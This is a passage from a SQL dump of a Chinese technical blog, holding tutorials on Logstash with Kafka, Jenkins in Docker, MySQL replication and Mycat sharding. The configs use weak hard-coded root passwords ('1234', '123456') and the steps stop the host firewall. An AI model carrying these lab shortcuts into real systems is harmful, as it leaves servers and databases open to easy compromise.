确认es集群,zookeeper,kafka,kibana正常运行\n![TIM截图20190519180115.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558269541_TIM截图20190519180115.png)\n#### 编写logtash输入输出配置文件\n![TIM截图20190519172747.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558269541_TIM截图20190519172747.png)\n```kotlin\ninput {\n	 kafka {\n	   bootstrap_servers => \"192.168.147.100:9092\"\n	   topics => [\"my_log\"]\n	 }\n}\noutput {\n	   stdout { codec => rubydebug }\n	   elasticsearch {\n	      hosts => [\"192.168.147.100:9200\",\"192.168.147.100:9201\"]\n	      index => \"my_log\"\n	   }\n} \n```\n#### 启动logstash\n![TIM截图20190519180549.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558269541_TIM截图20190519180549.png)\n```kotlin\n// 指定配置文件启动logstash,logstash目录下\n./bin/logstash -f ./myconfig/mylog.conf\n```\n\n\n### 应用服务器发送日志至kafka\n![TIM截图20190519181300.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558269760_TIM截图20190519181300.png)\n![TIM截图20190519181201.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558269761_TIM截图20190519181201.png)\n![TIM截图20190519182307.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558269761_TIM截图20190519182307.png)\n\n### 查看流程是否打通\n![TIM截图20190519182450.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558269761_TIM截图20190519182450.png)\n![TIM截图20190519182627.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558269761_TIM截图20190519182627.png)', 0, 0, 62, 0, 0, '2019-10-16 19:26:52', '2019-10-16 19:26:52', 0, 0);
INSERT INTO `article` VALUES (47, 1, 'docker安装jenkins并拉取pom项目打包启动', '2019/5/1558881111_b466c3f4accf55d4937c2b6b0fcd03c4.jpg', '### 搭建目标\n![Jenkins拉取pom项目.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626681080_Jenkins-拉取pom项目.png)\n```java\n利用jenkins拉取git上的项目\n将项目放入jenkins中进行管理\n```\n### 安装搭建\n#### 下载镜像启动容器\n![TIM截图20190526200230.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558881840_TIM截图20190526200230.png)\n\n#### 获取初始密码\n![TIM截图20190526200307.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558881841_TIM截图20190526200307.png)\n![TIM截图20190526200419.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558881841_TIM截图20190526200419.png)\n```kotlin\n// 1. 使用docker 安装jenkins\ndocker run -d -p 8080:8080 -p 50000:50000 -v jenkins_data:/var/jenkins_home jenkinsci/blueocean \n\n// 2. 关闭防火墙\nsystemctl stop firewalld\n\n// 3. 查看容器是否正常运行\ndocker ps\n\n// 4. 进入jenkins容器\ndocker exec -it 3d98fb9988ef /bin/bash\n\n// 5. 查看初始密码\ncat /var/jenkins_home/secrets/initialAdminPassword\n```\n\n#### 进入主页面\n![TIM截图20190526200837.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558881841_TIM截图20190526200837.png)\n![TIM截图20190526200933.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558881841_TIM截图20190526200933.png)\n![TIM截图20190526200958.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558881841_TIM截图20190526200958.png)\n![TIM截图20190526201015.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558881841_TIM截图20190526201015.png)\n\n### 配置jdk\n![TIM截图20190526205636.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558882266_TIM截图20190526205636.png)\n![TIM截图20190526205950.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558882266_TIM截图20190526205950.png)\n![TIM截图20190526210119.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558882266_TIM截图20190526210119.png)\n```kotlin\n// 1. 进入容器\ndocker exec -it 3d98fb9988ef /bin/bash\n\n// 2. jenkins中自带了jdk,查询JAVA_HOME位置\necho $JAVA_HOME\n\n``` \n\n### 配置maven\n#### 下载maven\n```java\n1. jenkins中不携带maven,需要自行下载 \n2. https://repo.maven.apache.org/maven2/org/apache/maven/apache-maven/ \n\n```\n####  更换maven镜像源\n![TIM截图20190526210418.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558882266_TIM截图20190526210418.png)\n![TIM截图20190526210803.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558882267_TIM截图20190526210803.png)\n![TIM截图20190526210909.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558882267_TIM截图20190526210909.png)\n```kotlin\n// 1. 将maven放入jenkins容器目录中\ndocker cp /usr/apache-maven-3.6.1 3d98fb9988ef:/var/lib/\n```\n\n### 拉取git上的pom项目\n#### 下载maven插件\n![TIM截图20190526201120.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883001_TIM截图20190526201120.png)\n![TIM截图20190526201325.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883002_TIM截图20190526201325.png)\n![TIM截图20190526205352.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883002_TIM截图20190526205352.png)\n```kotlin\n// 1. 进入容器\ndocker exec -it 3d98fb9988ef /bin/bash\n\n// 2. 修改/var/jenkins_home/hudson.model.UpdateCenter.xml文件,更换镜像源\nvi /var/jenkins_home/hudson.model.UpdateCenter.xml\nhttp://mirror.xmission.com/jenkins/updates/current/update-center.json \n\n// 2. 重启docker\nsystemctl restart docker\n\n// 3. 运行jenkins容器\ndocker start 3d98fb9988ef\n```\n![TIM截图20190526203158.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883002_TIM截图20190526203158.png)\n![TIM截图20190526205604.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883002_TIM截图20190526205604.png)\n\n#### 新建任务配置git仓库信息\n![TIM截图20190526211417.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883460_TIM截图20190526211417.png)\n![TIM截图20190526211119.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883460_TIM截图20190526211119.png)\n![TIM截图20190526211159.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883460_TIM截图20190526211159.png)\n![TIM截图20190526211222.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883460_TIM截图20190526211222.png)\n![TIM截图20190526211249.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883460_TIM截图20190526211249.png)\n![TIM截图20190526211512.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883617_TIM截图20190526211512.png)\n![TIM截图20190526211623.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883617_TIM截图20190526211623.png)\n![TIM截图20190526211653.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883617_TIM截图20190526211653.png)\n![TIM截图20190526211823.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883617_TIM截图20190526211823.png)\n\n#### 构建项目并开放容器的端口\n![TIM截图20190526211908.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883618_TIM截图20190526211908.png)\n![TIM截图20190526212019.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883618_TIM截图20190526212019.png)\n![TIM截图20190526212359.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883945_TIM截图20190526212359.png)\n![TIM截图20190526212521.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883945_TIM截图20190526212521.png)\n![TIM截图20190526213129.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883945_TIM截图20190526213129.png)\n![TIM截图20190526213341.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883945_TIM截图20190526213341.png)\n![TIM截图20190526213609.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883945_TIM截图20190526213609.png)\n![TIM截图20190526214441.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883945_TIM截图20190526214441.png)\n![TIM截图20190526214848.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883945_TIM截图20190526214848.png)\n![TIM截图20190526215252.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883946_TIM截图20190526215252.png)\n![TIM截图20190526215540.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883946_TIM截图20190526215540.png)\n![TIM截图20190526215646.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558883946_TIM截图20190526215646.png)\n```kotlin\n// 1. 查看容器名称\ndocker ps\n\n// 2. 查看某容器的配置信息,查看某容器的hashId\ndocker inspect quizzical_golick\n\n// 3. 进入docker的容器配置目录\ncd /var/lib/docker/containers/容器的hashId\n\n// 4. 修改config.v2.json,注意位置\nvi config.v2.json\n\"7000/tcp\":{}\n\n// 5. 修改hostconfig.json,注意位置\nvi hostconfig.json\n\"7000/tcp\":[{\"HostIp\":\"\",\"HostPort\":\"7000\"}]\n\n// 6. 重启docker\nsystemctl stop docker\n\n// 7. 启动jenkins\ndocker start 3d98fb9988ef\n\n// 8. 查看端口是否被开放\ndocker ps\n```\n\n### 构建时自动启动项目\n![TIM截图20190526215826.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558884668_TIM截图20190526215826.png)\n![TIM截图20190526220040.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558884668_TIM截图20190526220040.png)\n![TIM截图20190526220135.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558884668_TIM截图20190526220135.png)\n![TIM截图20190526220446.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1558884668_TIM截图20190526220446.png)\n```kotlin\n## 脚本,自行修改\n#!/bin/bash\n#服务名称\nSERVER_NAME=springboot-basic\n# 源jar路径,mvn打包完成之后，target目录下的jar包名称，也可选择成为war包，war包可移动到Tomcat的webapps目录下运行，这里使用jar包，用java -jar 命令执行  \nJAR_NAME=springboot-basic-0.0.1\n# 源jar路径  \n#/usr/local/jenkins_home/workspace--->jenkins 工作目录\n#demo 项目目录\n#target 打包生成jar包的目录\nJAR_PATH=/var/jenkins_home/workspace/springboot-basic/target\n# 打包完成之后，把jar包移动到运行jar包的目录--->work_daemon，work_daemon这个目录需要自己提前创建\nJAR_WORK_PATH=/var/jenkins_home/workspace/springboot-basic/target\n\necho \"查询进程id-->$SERVER_NAME\"\nPID=`ps -ef | grep \"$SERVER_NAME\" | awk \'{print $2}\'`\necho \"得到进程ID：$PID\"\necho \"结束进程\"\nfor id in $PID\ndo\n	kill -9 $id  \n	echo \"killed $id\"  \ndone\necho \"结束进程完成\"\n\n#复制jar包到执行目录\necho \"复制jar包到执行目录:cp $JAR_PATH/$JAR_NAME.jar $JAR_WORK_PATH\"\ncp $JAR_PATH/$JAR_NAME.jar $JAR_WORK_PATH\necho \"复制jar包完成\"\ncd $JAR_WORK_PATH\n#修改文件权限\nchmod 755 $JAR_NAME.jar\n\njava -jar $JAR_NAME.jar\n\n# 后台启动\nBUILD_ID=dontKillMe nohup java -jar  $JAR_NAME.jar  &\n```', 0, 0, 54, 0, 0, '2019-10-26 22:31:59', '2019-10-26 22:31:59', 0, 0);
INSERT INTO `article` VALUES (48, 1, 'mysql主从复制配置', '2019/5/1559048553_5698C9B20BF182F5C826636B267CA7E8.jpg', '### 搭建目标\n![Mysql主从复制目的.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626681449_Mysql-主从复制目的.png)\n```java\n// 主从复制目的\n1. 高可用集群\n2. 读写分离\n3. 故障转移\n```\n### 主服务器配置\n![TIM截图20190528195515.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559049222_TIM截图20190528195515.png)\n![TIM截图20190528200133.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559049222_TIM截图20190528200133.png)\n```kotlin\n// 1. 修改/etc/my.cnf\nserver_id=100\nlog-bin=mysql-bin\n\n// 2. 重启mysql服务\nservice mysqld restart\n\n// 3. 验证是否配置成功\nshow variables like \'%server_id%\';\n\n// 4. 查看日志文件\nshow master status;\n```\n\n### 从服务器配置\n![TIM截图20190528200955.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559049223_TIM截图20190528200955.png)\n![TIM截图20190528203124.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559049223_TIM截图20190528203124.png)\n```kotlin\n// 1. 修改/etc/my.cnf\nserver_id=101\nlog-bin=mysql-bin\nbinlog_do_db=test	// 同步数据库名称\n\n// 2. 重启mysql服务\nservice mysql restart\n\n// 3. 验证是否配置成功\nshow variables like \'%server_id%\';\n\n// 4. 查看日志文件\nshow master status;\n\n// 5. 同步配置,添加主服务器相关信息\nchange master to master_host=\'192.168.147.100\',master_user=\'root\',master_password=\'1234\',\n         master_log_file=\'mysql-bin.000001\',master_log_pos=120;\n\n// 6. 开始同步\nstart slave;\n\n// 7. 验证复制功能状态\nshow slave status;\n```\n\n### 验证效果成功\n![TIM截图20190528203631.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559049223_TIM截图20190528203631.png)\n![TIM截图20190528204129.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559049223_TIM截图20190528204129.png)', 0, 0, 46, 0, 0, '2019-10-28 21:02:44', '2019-10-28 21:02:44', 0, 0);
INSERT INTO `article` VALUES (49, 1, 'mycat读写分离配置', '2019/5/1559131412_04853a2686c7c630bd8dabd5f95f813f.jpg', '### 搭建目标\n![Mysqlmycat读写分离目标.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626681937_Mysql-mycat读写分离目标.png)\n```java\n1. 读写分离,简单来说是把对数据库的读和写操作分开\n2. 有效地减轻单台服务库压力\n\n```\n### 配置mycat\n![TIM截图20190528222335.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132775_TIM截图20190528222335.png)\n![TIM截图20190528225820.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190528225820.png)\n![TIM截图20190528231623.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190528231623.png)\n![TIM截图20190528232130.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190528232130.png)\n```kotlin\n// 1. 解压mycat\ntar -zxvf Mycat-server-1.6.5-release-20180122220033-linux.tar.gz\n\n// 2. 进入mycat目录\ncd mycat\n\n// 3. 进入mycat配置目录\ncd conf \n```\n#### schema.xml配置\n```kotlin\n<?xml version=\"1.0\"?>\n<!DOCTYPE mycat:schema SYSTEM \"schema.dtd\">\n<mycat:schema xmlns:mycat=\"http://io.mycat/\">\n    <!-- TESTDB1 是mycat的逻辑库名称，链接需要用的 -->\n    <schema name=\"mycat_testdb\" checkSQLschema=\"false\" sqlMaxLimit=\"100\" dataNode=\"dn1\"></schema>\n        <!-- database 是MySQL数据库的库名 -->\n    <dataNode name=\"dn1\" dataHost=\"localhost1\" database=\"test\" />\n    <!--\n    dataNode节点中各属性说明：\n    name：指定逻辑数据节点名称；\n    dataHost：指定逻辑数据节点物理主机节点名称；\n    database：指定物理主机节点上。如果一个节点上有多个库，可使用表达式db$0-99，     表示指定0-99这100个数据库；\n\n    dataHost 节点中各属性说明：\n        name：物理主机节点名称；\n        maxCon：指定物理主机服务最大支持1000个连接；\n        minCon：指定物理主机服务最小保持10个连接；\n        writeType：指定写入类型；\n            0，只在writeHost节点写入；\n            1，在所有节点都写入。慎重开启，多节点写入顺序为默认写入根据配置顺序，第一个挂掉切换另一个；\n        dbType：指定数据库类型；\n        dbDriver：指定数据库驱动；\n        balance：指定物理主机服务的负载模式。  \n            0，不开启读写分离机制；\n            1，全部的readHost与stand by writeHost参与select语句的负载均衡，简单的说，当双主双从模式(M1->S1，M2->S2，并且M1与 M2互为主备)，正常情况下，M2,S1,S2都参与select语句的负载均衡；\n            2，所有的readHost与writeHost都参与select语句的负载均衡，也就是说，当系统的写操作压力不大的情况下，所有主机都可以承担负载均衡；\n            3. 所有读请求随机分发到writeHost对应的readHost执行，writeHost不负担读压力\n-->\n    <dataHost name=\"localhost1\" maxCon=\"1000\" minCon=\"10\" balance=\"3\" writeType=\"0\" dbType=\"mysql\" dbDriver=\"native\" switchType=\"1\"  slaveThreshold=\"100\">\n        <heartbeat>select user()</heartbeat>\n        <!-- 可以配置多个主从 -->\n        <writeHost host=\"hostM1\" url=\"192.168.147.100:3306\" user=\"root\" password=\"1234\">\n            <!-- 可以配置多个从库 -->\n            <readHost host=\"hostS2\" url=\"192.168.147.101:3306\" user=\"root\" password=\"1234\" />\n        </writeHost>\n    </dataHost>\n</mycat:schema>\n```\n#### server.xml配置\n```kotlin\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- - - Licensed under the Apache License, Version 2.0 (the \"License\"); \n	- you may not use this file except in compliance with the License. - You \n	may obtain a copy of the License at - - http://www.apache.org/licenses/LICENSE-2.0 \n	- - Unless required by applicable law or agreed to in writing, software - \n	distributed under the License is distributed on an \"AS IS\" BASIS, - WITHOUT \n	WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. - See the \n	License for the specific language governing permissions and - limitations \n	under the License. -->\n<!DOCTYPE mycat:server SYSTEM \"server.dtd\">\n<mycat:server xmlns:mycat=\"http://io.mycat/\">\n   <!-- 读写都可用的用户 -->\n    <user name=\"root\" defaultAccount=\"true\">\n        <property name=\"password\">123456</property>\n        <!-- 连接mycat的逻辑库名称 -->\n        <property name=\"schemas\">mycat_testdb</property>\n        <!-- 表级 DML 权限设置 -->\n        <!--        \n        <privileges check=\"false\">\n            <schema name=\"TESTDB\" dml=\"0110\" >\n                <table name=\"tb01\" dml=\"0000\"></table>\n                <table name=\"tb02\" dml=\"1111\"></table>\n            </schema>\n        </privileges>       \n         -->\n    </user>\n\n    <!-- 只读用户 -->\n    <user name=\"user\">\n        <property name=\"password\">123456</property>\n        <property name=\"schemas\">mycat_testdb</property>\n        <property name=\"readOnly\">true</property>\n    </user>\n</mycat:server>\n```\n\n\n### 启动mycat测试\n![TIM截图20190528232554.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190528232554.png)\n![TIM截图20190528233016.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190528233016.png)\n```kotlin\n// 1. 进入bin目录\ncd mycat/bin/\n\n// 2. 启动mycat\n./mycat start\n\n// 3. 查看日志检查mycat是否启动成功\ncd ../log\ncat wrapper.log\n\n// 关闭mycat\n./mycat stop\n```\n\n![TIM截图20190528232859.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190528232859.png)\n![TIM截图20190528233136.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190528233136.png)\n![TIM截图20190528233509.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190528233509.png)\n![TIM截图20190528233639.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190528233639.png)\n\n### 代码整合测试\n![TIM截图20190529195134.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190529195134.png)\n![TIM截图20190529194841.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190529194841.png)\n![TIM截图20190529194744.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559132776_TIM截图20190529194744.png)', 0, 0, 55, 0, 0, '2019-10-29 20:03:36', '2019-10-29 20:03:36', 0, 0);
INSERT INTO `article` VALUES (50, 1, 'mycat分库分表配置', '2019/5/1559223018_d4556b605e5913098c4fb0439d37b43e.jpg', '### 搭建目标\n![Mysql分库分表搭建目标.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626682311_Mysql-分库分表搭建目标.png)\n```java\n1. 水平拆分(分表)是把同一个表拆到不同的数据库中,\n2. 相对于垂直拆分(分库),水平拆分不是将表的数据做分类,而是按照某个字段的某种规则来分散到多个库之中,每个表中包含一部分数据\n3. 简单来说,我们可以将数据的水平切分理解为是按照数据行的切分,就是将表中的某些行切分到一个数据库中而另外的某些行又切分到其他的数据库中,主要有分表,分库两种模式\n4. 该方式提高系统的稳定性和负载能力\n5. 若查询时不携带遵循分片策略规则的表字段作为条件,那么将会对集群数据库中所有数据库都进行查询,然后合并数据,效率极差\n6. 跨库join性能差,mycat使用limt查询,那么查出的数据是从集群数据库中随机的,排序后就是固定,且极为耗时\n\n// mycat所支持的分表分片策略\n1. 求模算法\n2. 分片枚举(常量)\n3. 范围约定\n4. 日期指定\n5. 固定分片hash算法\n6. 通配取模\n7. ascll码求模通配\n8. 编程指定\n9. 字符串拆分hash解析\n\n// 分片枚举常量规则\n// 什么是分片枚举常量\n1. 分片枚举算法就是根据某表字段不同的枚举(常量),进入分类存储(如地区)\n2. 大多数用于根据手机号,邮政编码来进行分表规则\n\n```\n#### 创建三个数据库与三张相同结构表\n![TIM截图20190529220056.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225203_TIM截图20190529220056.png)\n#### 自定义规则文件\n![TIM截图20190529221156.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225203_TIM截图20190529221156.png)\n![TIM截图20190529225140.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225203_TIM截图20190529225140.png)\n#### schema.xml\n![TIM截图20190529223545.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225203_TIM截图20190529223545.png)\n#### server.xml\n![TIM截图20190529223928.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225203_TIM截图20190529223928.png)\n```kotlin\n// partition-hash-int.txt \nbeijin=0\nshanghai=1\nguangzhou=2\n\n// rule.xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- - - Licensed under the Apache License, Version 2.0 (the \"License\");\n    - you may not use this file except in compliance with the License. - You\n    may obtain a copy of the License at - - http://www.apache.org/licenses/LICENSE-2.0\n    - - Unless required by applicable law or agreed to in writing, software -\n    distributed under the License is distributed on an \"AS IS\" BASIS, - WITHOUT\n    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. - See the\n    License for the specific language governing permissions and - limitations\n    under the License. -->\n<!DOCTYPE mycat:rule SYSTEM \"rule.dtd\">\n<mycat:rule xmlns:mycat=\"http://io.mycat/\">\n    <tableRule name=\"role2\">\n             <rule>\n                  <columns>name</columns>\n                <algorithm>hash-int</algorithm>\n                </rule>\n    </tableRule>\n	<function name=\"hash-int\" class=\"io.mycat.route.function.PartitionByFileMap\">\n		<property name=\"mapFile\">partition-hash-int.txt</property>\n        <!-- 数值类型: 0-->\n        <!-- 非数值类型: 1 -->\n		<property name=\"type\">1</property>\n        <!-- 如果不满足partition-hash-int.txt中北上广 \n             默认存放至北京->0\n            -->\n		<property name=\"defaultNode\">0</property>\n	</function>\n</mycat:rule>\n\n// schema.xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE mycat:schema SYSTEM \"schema.dtd\">\n<mycat:schema xmlns:mycat=\"http://io.mycat/\">\n    <!-- TESTDB1 是mycat的逻辑库名称，链接需要用的 -->\n    <schema name=\"mycat_testdb\" checkSQLschema=\"false\" sqlMaxLimit=\"100\" dataNode=\"dn1\">\n	  <table name=\"order_info\"  dataNode=\"dn1,dn2,dn3\" rule=\"role2\" /> \n	</schema>\n        <!-- database 是MySQL数据库的库名 -->\n    <dataNode name=\"dn1\" dataHost=\"localhost1\" database=\"user_db1\" />\n	<dataNode name=\"dn2\" dataHost=\"localhost1\" database=\"user_db2\" />\n	<dataNode name=\"dn3\" dataHost=\"localhost1\" database=\"user_db3\" />\n    <!--\n    dataNode节点中各属性说明：\n    name：指定逻辑数据节点名称；\n    dataHost：指定逻辑数据节点物理主机节点名称；\n    database：指定物理主机节点上。如果一个节点上有多个库，可使用表达式db$0-99，     表示指定0-99这100个数据库；\n    dataHost 节点中各属性说明：\n        name：物理主机节点名称；\n        maxCon：指定物理主机服务最大支持1000个连接；\n        minCon：指定物理主机服务最小保持10个连接；\n        writeType：指定写入类型；\n            0，只在writeHost节点写入；\n            1，在所有节点都写入。慎重开启，多节点写入顺序为默认写入根据配置顺序，第一个挂掉切换另一个；\n        dbType：指定数据库类型；\n        dbDriver：指定数据库驱动；\n        balance：指定物理主机服务的负载模式。\n            0，不开启读写分离机制；\n            1，全部的readHost与stand by writeHost参与select语句的负载均衡，简单的说，当双主双从模式(M1->S1，M2->S2，并且M1与 M2互为主备)，正常情况下，M2,S1,S2都参与select语句的负载均衡；\n            2，所有的readHost与writeHost都参与select语句的负载均衡，也就是说，当系统的写操作压力不大的情况下，所有主机都可以承担负载均衡；\n-->\n    <dataHost name=\"localhost1\" maxCon=\"1000\" minCon=\"10\" balance=\"3\" writeType=\"0\" dbType=\"mysql\" dbDriver=\"native\" switchType=\"1\"  slaveThreshold=\"100\">\n        <heartbeat>select user()</heartbeat>\n        <!-- 可以配置多个主从 -->\n        <writeHost host=\"hostM1\" url=\"192.168.147.100:3306\" user=\"root\" password=\"1234\">\n            <!-- 可以配置多个从库 -->\n            <readHost host=\"hostS2\" url=\"192.168.147.101:3306\" user=\"root\" password=\"1234\" />\n        </writeHost>\n    </dataHost>\n</mycat:schema>\n\n// server.xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- - - Licensed under the Apache License, Version 2.0 (the \"License\"); \n	- you may not use this file except in compliance with the License. - You \n	may obtain a copy of the License at - - http://www.apache.org/licenses/LICENSE-2.0 \n	- - Unless required by applicable law or agreed to in writing, software - \n	distributed under the License is distributed on an \"AS IS\" BASIS, - WITHOUT \n	WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. - See the \n	License for the specific language governing permissions and - limitations \n	under the License. -->\n<!DOCTYPE mycat:server SYSTEM \"server.dtd\">\n<mycat:server xmlns:mycat=\"http://io.mycat/\">\n   <!-- 读写都可用的用户 -->\n    <user name=\"root\" defaultAccount=\"true\">\n        <property name=\"password\">123456</property>\n        <property name=\"schemas\">mycat_testdb</property>\n\n        <!-- 表级 DML 权限设置 -->\n        <!--        \n        <privileges check=\"false\">\n            <schema name=\"TESTDB\" dml=\"0110\" >\n                <table name=\"tb01\" dml=\"0000\"></table>\n                <table name=\"tb02\" dml=\"1111\"></table>\n            </schema>\n        </privileges>       \n         -->\n    </user>\n    <!-- 只读用户 -->\n    <user name=\"user\">\n        <property name=\"password\">123456</property>\n        <property name=\"schemas\">mycat_testdb</property>\n        <property name=\"readOnly\">true</property>\n    </user>\n</mycat:server>\n```\n\n#### 启动mycat并查看效果\n![TIM截图20190530205723.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225364_TIM截图20190530205723.png)\n![TIM截图20190529231412.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225364_TIM截图20190529231412.png)\n\n### id取模规则\n```java\n// 什么是id取模规则\n1. 取模算法就是根据模运算进行拆分分发,例如对id进行取模运算进行分表,取模值一旦确定就不允许更改\n\n```\n\n![TIM截图20190530204344.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225656_TIM截图20190530204344.png)\n#### rule.xml\n![TIM截图20190530204751.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225656_TIM截图20190530204751.png)\n#### shcema.xml\n![TIM截图20190530205319.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225656_TIM截图20190530205319.png)\n![TIM截图20190530211104.png](http://blog.img.tuwq.cn/upload/artimg/2019/5/1559225656_TIM截图20190530211104.png)\n```kotlin\n// rule.xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- - - Licensed under the Apache License, Version 2.0 (the \"License\");\n    - you may not use this file except in compliance with the License. - You\n    may obtain a copy of the License at - - http://www.apache.org/licenses/LICENSE-2.0\n    - - Unless required by applicable law or agreed to in writing, software -\n    distributed under the License is distributed on an \"AS IS\" BASIS, - WITHOUT\n    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. - See the\n    License for the specific language governing permissions and - limitations\n    under the License. -->\n<!DOCTYPE mycat:rule SYSTEM \"rule.dtd\">\n<mycat:rule xmlns:mycat=\"http://io.mycat/\">\n   <tableRule name=\"role1\">\n        <rule>\n            <columns>id</columns>\n            <algorithm>mod-long</algorithm>\n        </rule>\n    </tableRule>\n \n    <function name=\"mod-long\" class=\"io.mycat.route.function.PartitionByMod\">\n        <!--指定分片数量，不可以被更改-->\n        <property name=\"count\">3</property>\n</function>	\n</mycat:rule>\n\n// schema.xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE mycat:schema SYSTEM \"schema.dtd\">\n<mycat:schema xmlns:mycat=\"http://io.mycat/\">\n    <!-- TESTDB1 是mycat的逻辑库名称，链接需要用的 -->\n    <schema name=\"mycat_testdb\" checkSQLschema=\"false\" sqlMaxLimit=\"100\" dataNode=\"dn1\">\n	<table name=\"user_info\" dataNode=\"dn1,dn2,dn3\" rule=\"role1\"/>\n	</schema>\n        <!-- database 是MySQL数据库的库名 -->\n    <dataNode name=\"dn1\" dataHost=\"localhost1\" database=\"user_db1\" />\n	<dataNode name=\"dn2\" dataHost=\"localhost1\" database=\"user_db2\" />\n	<dataNode name=\"dn3\" dataHost=\"localhost1\" database=\"user_db3\" />\n    <!--\n    dataNode节点中各属性说明：\n    name：指定逻辑数据节点名称；\n    dataHost：指定逻辑数据节点物理主机节点名称；\n    database：指定物理主机节点上。如果一个节点上有多个库，可使用表达式db$0-99，     表示指定0-99这100个数据库；\n    dataHost 节点中各属性说明：\n        name：物理主机节点名称；\n        maxCon：指定物理主机服务最大支持1000个连接；\n        minCon：指定物理主机服务最小保持10个连接；\n        writeType：指定写入类型；\n            0，只在writeHost节点写入；\n            1，在所有节点都写入。慎重开启，多节点写入顺序为默认写入根据配置顺序，第一个挂掉切换另一个；\n        dbType：指定数据库类型；\n        dbDriver：指定数据库驱动；\n        balance：指定物理主机服务的负载模式。\n            0，不开启读写分离机制；\n            1，全部的readHost与stand 